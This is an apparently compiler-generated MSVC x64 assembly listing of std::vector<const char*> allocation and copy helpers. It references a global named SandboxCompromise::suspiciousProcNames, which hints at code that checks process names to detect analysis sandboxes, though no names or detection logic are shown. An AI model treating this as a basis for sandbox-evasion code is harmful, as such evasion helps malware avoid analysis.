_TEXT	SEGMENT
this$dead$ = 8
?max_size@?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEBA_KXZ PROC ; std::vector<char const *,std::allocator<char const *> >::max_size, COMDAT

; 1877 :         return (_STD min)(

	mov	rax, 2305843009213693951		; 1fffffffffffffffH

; 1878 :             static_cast<size_type>((numeric_limits<difference_type>::max)()), _Alty_traits::max_size(_Getal()));
; 1879 :     }

	ret	0
?max_size@?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEBA_KXZ ENDP ; std::vector<char const *,std::allocator<char const *> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Getal@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEBAAEBV?$allocator@PEBD@2@XZ
_TEXT	SEGMENT
this$dead$ = 8
?_Getal@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEBAAEBV?$allocator@PEBD@2@XZ PROC ; std::vector<char const *,std::allocator<char const *> >::_Getal, COMDAT

; 2189 :         return _Mypair._Get_first();

	lea	rax, OFFSET FLAT:?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A ; SandboxCompromise::suspiciousProcNames

; 2190 :     }

	ret	0
?_Getal@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEBAAEBV?$allocator@PEBD@2@XZ ENDP ; std::vector<char const *,std::allocator<char const *> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEBAAEBV?$allocator@PEBD@2@XZ
_TEXT	SEGMENT
this$dead$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEBAAEBV?$allocator@PEBD@2@XZ PROC ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Get_first, COMDAT

; 1508 :         return *this;

	lea	rax, OFFSET FLAT:?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A ; SandboxCompromise::suspiciousProcNames

; 1509 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEBAAEBV?$allocator@PEBD@2@XZ ENDP ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@PEBD@std@@@std@@SA_KAEBV?$allocator@PEBD@2@@Z
_TEXT	SEGMENT
__formal$dead$ = 8
?max_size@?$_Default_allocator_traits@V?$allocator@PEBD@std@@@std@@SA_KAEBV?$allocator@PEBD@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<char const *> >::max_size, COMDAT

; 714  :         return static_cast<size_t>(-1) / sizeof(value_type);

	mov	rax, 2305843009213693951		; 1fffffffffffffffH

; 715  :     }

	ret	0
?max_size@?$_Default_allocator_traits@V?$allocator@PEBD@std@@@std@@SA_KAEBV?$allocator@PEBD@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<char const *> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Buy_raw@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Newcapacity$ = 56
?_Buy_raw@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z PROC ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw, COMDAT

; 1983 :     _CONSTEXPR20 void _Buy_raw(size_type _Newcapacity) {

$LN45:
	push	rbx
	sub	rsp, 32					; 00000020H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 2305843009213693951		; 1fffffffffffffffH
	cmp	rdx, rax
	ja	SHORT $LN36@Buy_raw

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	lea	rbx, QWORD PTR [rdx*8]

; 196  :     if (_Bytes == 0) {

	test	rbx, rbx
	jne	SHORT $LN12@Buy_raw

; 197  :         return nullptr;

	xor	eax, eax
	jmp	SHORT $LN11@Buy_raw
$LN12@Buy_raw:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rbx, 4096				; 00001000H
	jb	SHORT $LN14@Buy_raw

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rbx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rbx
	jbe	SHORT $LN36@Buy_raw

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN24@Buy_raw

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN11@Buy_raw
$LN14@Buy_raw:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rbx
	call	??2@YAPEAX_K@Z				; operator new
$LN11@Buy_raw:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1994 :         _Myfirst              = _Newvec;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, rax

; 1995 :         _Mylast               = _Newvec;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+8, rax

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	add	rax, rbx
	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16, rax

; 1997 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN36@Buy_raw:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN24@Buy_raw:

; 156  :     }
; 157  : 
; 158  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@Buy_raw:
?_Buy_raw@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z ENDP ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@PEBD@std@@@std@@YAPEAPEBDAEAV?$allocator@PEBD@0@AEA_K@Z
_TEXT	SEGMENT
_Al$dead$ = 48
_Count$ = 56
??$_Allocate_at_least_helper@V?$allocator@PEBD@std@@@std@@YAPEAPEBDAEAV?$allocator@PEBD@0@AEA_K@Z PROC ; std::_Allocate_at_least_helper<std::allocator<char const *> >, COMDAT

; 2177 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

$LN37:
	sub	rsp, 40					; 00000028H

; 2178 : #if _HAS_CXX23
; 2179 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2180 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2181 :         _Count                  = _Allocated;
; 2182 :         return _Ptr;
; 2183 :     } else
; 2184 : #endif // _HAS_CXX23
; 2185 :     {
; 2186 :         return _Al.allocate(_Count);

	mov	rcx, QWORD PTR [rdx]

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 2305843009213693951		; 1fffffffffffffffH
	cmp	rcx, rax
	ja	SHORT $LN33@Allocate_a

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	lea	rcx, QWORD PTR [rcx*8]

; 196  :     if (_Bytes == 0) {

	test	rcx, rcx
	jne	SHORT $LN10@Allocate_a

; 197  :         return nullptr;

	xor	eax, eax

; 2187 :     }
; 2188 : }

	add	rsp, 40					; 00000028H
	ret	0
$LN10@Allocate_a:

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN12@Allocate_a

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	SHORT $LN33@Allocate_a

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN22@Allocate_a

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 2187 :     }
; 2188 : }

	add	rsp, 40					; 00000028H
	ret	0
$LN12@Allocate_a:
	add	rsp, 40					; 00000028H

; 101  :         return ::operator new(_Bytes);

	jmp	??2@YAPEAX_K@Z				; operator new
$LN33@Allocate_a:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN22@Allocate_a:

; 156  :     }
; 157  : 
; 158  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN35@Allocate_a:
??$_Allocate_at_least_helper@V?$allocator@PEBD@std@@@std@@YAPEAPEBDAEAV?$allocator@PEBD@0@AEA_K@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@PEBQEBD@std@@YA$$QEAPEBQEBDAEAPEBQEBD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@PEBQEBD@std@@YA$$QEAPEBQEBDAEAPEBQEBD@Z PROC	; std::forward<char const * const *>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@PEBQEBD@std@@YA$$QEAPEBQEBDAEAPEBQEBD@Z ENDP	; std::forward<char const * const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Unwrap_iter@PEBQEBDPEBQEBD@ranges@std@@YA?A_T$$QEAPEBQEBD@Z
_TEXT	SEGMENT
_It$ = 8
??$_Unwrap_iter@PEBQEBDPEBQEBD@ranges@std@@YA?A_T$$QEAPEBQEBD@Z PROC ; std::ranges::_Unwrap_iter<char const * const *,char const * const *>, COMDAT

; 2640 :         _STL_INTERNAL_STATIC_ASSERT(sentinel_for<remove_cvref_t<_Sent>, remove_cvref_t<_Iter>>);
; 2641 :         if constexpr (is_pointer_v<remove_cvref_t<_Iter>>) {
; 2642 :             return _It + 0;

	mov	rax, QWORD PTR [rcx]

; 2643 :         } else if constexpr (_Unwrappable_sentinel_for<_Sent, _Iter>) {
; 2644 :             return static_cast<_Iter&&>(_It)._Unwrapped();
; 2645 :         } else {
; 2646 :             return static_cast<_Iter&&>(_It);
; 2647 :         }
; 2648 :     }

	ret	0
??$_Unwrap_iter@PEBQEBDPEBQEBD@ranges@std@@YA?A_T$$QEAPEBQEBD@Z ENDP ; std::ranges::_Unwrap_iter<char const * const *,char const * const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Unwrap_sent@PEBQEBDPEBQEBD@ranges@std@@YA?A_T$$QEAPEBQEBD@Z
_TEXT	SEGMENT
_Se$ = 8
??$_Unwrap_sent@PEBQEBDPEBQEBD@ranges@std@@YA?A_T$$QEAPEBQEBD@Z PROC ; std::ranges::_Unwrap_sent<char const * const *,char const * const *>, COMDAT

; 2653 :         _STL_INTERNAL_STATIC_ASSERT(sentinel_for<remove_cvref_t<_Sent>, remove_cvref_t<_Iter>>);
; 2654 :         if constexpr (is_pointer_v<remove_cvref_t<_Sent>>) {
; 2655 :             return _Se + 0;

	mov	rax, QWORD PTR [rcx]

; 2656 :         } else if constexpr (_Unwrappable_sentinel_for<_Sent, _Iter>) {
; 2657 :             return static_cast<_Sent&&>(_Se)._Unwrapped();
; 2658 :         } else {
; 2659 :             return static_cast<_Sent&&>(_Se);
; 2660 :         }
; 2661 :     }

	ret	0
??$_Unwrap_sent@PEBQEBDPEBQEBD@ranges@std@@YA?A_T$$QEAPEBQEBD@Z ENDP ; std::ranges::_Unwrap_sent<char const * const *,char const * const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Uninitialized_copy@PEBQEBDPEBQEBDV?$allocator@PEBD@std@@@std@@YAPEAPEBDPEBQEBD0PEAPEBDAEAV?$allocator@PEBD@0@@Z
_TEXT	SEGMENT
_First$ = 48
_Last$ = 56
_Dest$ = 64
_Al$dead$ = 72
??$_Uninitialized_copy@PEBQEBDPEBQEBDV?$allocator@PEBD@std@@@std@@YAPEAPEBDPEBQEBD0PEAPEBDAEAV?$allocator@PEBD@0@@Z PROC ; std::_Uninitialized_copy<char const * const *,char const * const *,std::allocator<char const *> >, COMDAT

; 1797 :     _InIt _First, _Se _Last, _Alloc_ptr_t<_Alloc> _Dest, _Alloc& _Al) {

$LN24:
	mov	QWORD PTR [rsp+32], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx
	mov	rdi, r8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	rbx, rcx

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rdx, rcx
	mov	r8, rbx
	mov	rcx, rdi
	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1822 :                 _Dest += _ULast - _UFirst;

	sar	rbx, 3
	lea	rax, QWORD PTR [rdi+rbx*8]

; 1823 :             } else {
; 1824 :                 const auto _Count = static_cast<size_t>(_ULast - _UFirst);
; 1825 :                 _STD _Copy_memmove_n(_STD _To_address(_UFirst), _Count, _STD _Unfancy(_Dest));
; 1826 :                 _Dest += _Count;
; 1827 :             }
; 1828 :             return _Dest;
; 1829 :         }
; 1830 :     }
; 1831 : 
; 1832 :     _Uninitialized_backout_al<_Alloc> _Backout{_Dest, _Al};
; 1833 :     for (; _UFirst != _ULast; ++_UFirst) {
; 1834 :         _Backout._Emplace_back(*_UFirst);
; 1835 :     }
; 1836 : 
; 1837 :     return _Backout._Release();
; 1838 : }

	mov	rbx, QWORD PTR [rsp+72]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??$_Uninitialized_copy@PEBQEBDPEBQEBDV?$allocator@PEBD@std@@@std@@YAPEAPEBDPEBQEBD0PEAPEBDAEAV?$allocator@PEBD@0@@Z ENDP ; std::_Uninitialized_copy<char const * const *,char const * const *,std::allocator<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_To_address@PEBQEBD@std@@YA?A_PAEBQEBQEBD@Z
_TEXT	SEGMENT
_Val$ = 8
??$_To_address@PEBQEBD@std@@YA?A_PAEBQEBQEBD@Z PROC	; std::_To_address<char const * const *>, COMDAT

; 4482 :     _STL_INTERNAL_STATIC_ASSERT(contiguous_iterator<_Iter>);
; 4483 :     return _STD to_address(_Val);

	mov	rax, QWORD PTR [rcx]

; 4484 : }

	ret	0
??$_To_address@PEBQEBD@std@@YA?A_PAEBQEBQEBD@Z ENDP	; std::_To_address<char const * const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$move@AEAPEBQEBD@std@@YA$$QEAPEBQEBDAEAPEBQEBD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAPEBQEBD@std@@YA$$QEAPEBQEBDAEAPEBQEBD@Z PROC	; std::move<char const * const * &>, COMDAT

; 1548 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, rcx

; 1549 : }

	ret	0
??$move@AEAPEBQEBD@std@@YA$$QEAPEBQEBDAEAPEBQEBD@Z ENDP	; std::move<char const * const * &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??0?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAA@PEAPEBDAEAV?$allocator@PEBD@1@@Z
_TEXT	SEGMENT
this$ = 8
_Dest$ = 16
_Al_$ = 24
??0?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAA@PEAPEBDAEAV?$allocator@PEBD@1@@Z PROC ; std::_Uninitialized_backout_al<std::allocator<char const *> >::_Uninitialized_backout_al<std::allocator<char const *> >, COMDAT

; 1769 :     _CONSTEXPR20 _Uninitialized_backout_al(pointer _Dest, _Alloc& _Al_) : _First(_Dest), _Last(_Dest), _Al(_Al_) {}

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	mov	QWORD PTR [rcx+8], rdx
	mov	QWORD PTR [rcx+16], r8
	ret	0
??0?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAA@PEAPEBDAEAV?$allocator@PEBD@1@@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<char const *> >::_Uninitialized_backout_al<std::allocator<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Emplace_back@AEBQEBD@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAXAEBQEBD@Z
_TEXT	SEGMENT
this$ = 8
<_Vals_0>$ = 16
??$_Emplace_back@AEBQEBD@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAXAEBQEBD@Z PROC ; std::_Uninitialized_backout_al<std::allocator<char const *> >::_Emplace_back<char const * const &>, COMDAT

; 1780 :         allocator_traits<_Alloc>::construct(_Al, _STD _Unfancy(_Last), _STD forward<_Types>(_Vals)...);

	mov	r8, QWORD PTR [rcx+8]
	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [r8], rax

; 1781 :         ++_Last;

	add	QWORD PTR [rcx+8], 8

; 1782 :     }

	ret	0
??$_Emplace_back@AEBQEBD@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAXAEBQEBD@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<char const *> >::_Emplace_back<char const * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Unfancy@PEBD@std@@YAPEAPEBDPEAPEBD@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Unfancy@PEBD@std@@YAPEAPEBDPEAPEBD@Z PROC		; std::_Unfancy<char const *>, COMDAT

; 36   :     return _Ptr;

	mov	rax, rcx

; 37   : }

	ret	0
??$_Unfancy@PEBD@std@@YAPEAPEBDPEAPEBD@Z ENDP		; std::_Unfancy<char const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEBQEBD@std@@YAAEBQEBDAEBQEBD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBQEBD@std@@YAAEBQEBDAEBQEBD@Z PROC		; std::forward<char const * const &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEBQEBD@std@@YAAEBQEBDAEBQEBD@Z ENDP		; std::forward<char const * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$construct@PEBDAEBQEBD@?$_Default_allocator_traits@V?$allocator@PEBD@std@@@std@@SAXAEAV?$allocator@PEBD@1@QEAPEBDAEBQEBD@Z
_TEXT	SEGMENT
__formal$dead$ = 8
_Ptr$ = 16
<_Args_0>$ = 24
??$construct@PEBDAEBQEBD@?$_Default_allocator_traits@V?$allocator@PEBD@std@@@std@@SAXAEAV?$allocator@PEBD@1@QEAPEBDAEBQEBD@Z PROC ; std::_Default_allocator_traits<std::allocator<char const *> >::construct<char const *,char const * const &>, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	mov	rax, QWORD PTR [r8]
	mov	QWORD PTR [rdx], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 702  :     }

	ret	0
??$construct@PEBDAEBQEBD@?$_Default_allocator_traits@V?$allocator@PEBD@std@@@std@@SAXAEAV?$allocator@PEBD@1@QEAPEBDAEBQEBD@Z ENDP ; std::_Default_allocator_traits<std::allocator<char const *> >::construct<char const *,char const * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@PEBDAEBQEBD$0A@@std@@YAPEAPEBDQEAPEBDAEBQEBD@Z
_TEXT	SEGMENT
_Location$ = 8
<_Args_0>$ = 16
??$construct_at@PEBDAEBQEBD$0A@@std@@YAPEAPEBDQEAPEBDAEBQEBD@Z PROC ; std::construct_at<char const *,char const * const &,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@PEBDAEBQEBD$0A@@std@@YAPEAPEBDQEAPEBDAEBQEBD@Z ENDP ; std::construct_at<char const *,char const * const &,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Release@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAPEAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?_Release@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAPEAPEBDXZ PROC ; std::_Uninitialized_backout_al<std::allocator<char const *> >::_Release, COMDAT

; 1785 :         _First = _Last;

	mov	rax, QWORD PTR [rcx+8]
	mov	QWORD PTR [rcx], rax

; 1786 :         return _Last;
; 1787 :     }

	ret	0
?_Release@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAPEAPEBDXZ ENDP ; std::_Uninitialized_backout_al<std::allocator<char const *> >::_Release
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAA@XZ PROC ; std::_Uninitialized_backout_al<std::allocator<char const *> >::~_Uninitialized_backout_al<std::allocator<char const *> >, COMDAT

; 1775 :         _STD _Destroy_range(_First, _Last, _Al);
; 1776 :     }

	ret	0
??1?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAA@XZ ENDP ; std::_Uninitialized_backout_al<std::allocator<char const *> >::~_Uninitialized_backout_al<std::allocator<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Destroy_range@V?$allocator@PEBD@std@@@std@@YAXPEAPEBDQEAPEBDAEAV?$allocator@PEBD@0@@Z
_TEXT	SEGMENT
_First$dead$ = 8
_Last$dead$ = 16
_Al$dead$ = 24
??$_Destroy_range@V?$allocator@PEBD@std@@@std@@YAXPEAPEBDQEAPEBDAEAV?$allocator@PEBD@0@@Z PROC ; std::_Destroy_range<std::allocator<char const *> >, COMDAT

; 1064 :     // note that this is an optimization for debug mode codegen; in release mode the BE removes all of this
; 1065 :     using _Ty = typename _Alloc::value_type;
; 1066 :     if constexpr (!conjunction_v<is_trivially_destructible<_Ty>, _Uses_default_destroy<_Alloc, _Ty*>>) {
; 1067 :         for (; _First != _Last; ++_First) {
; 1068 :             allocator_traits<_Alloc>::destroy(_Al, _STD _Unfancy(_First));
; 1069 :         }
; 1070 :     }
; 1071 : }

	ret	0
??$_Destroy_range@V?$allocator@PEBD@std@@@std@@YAXPEAPEBDQEAPEBDAEAV?$allocator@PEBD@0@@Z ENDP ; std::_Destroy_range<std::allocator<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
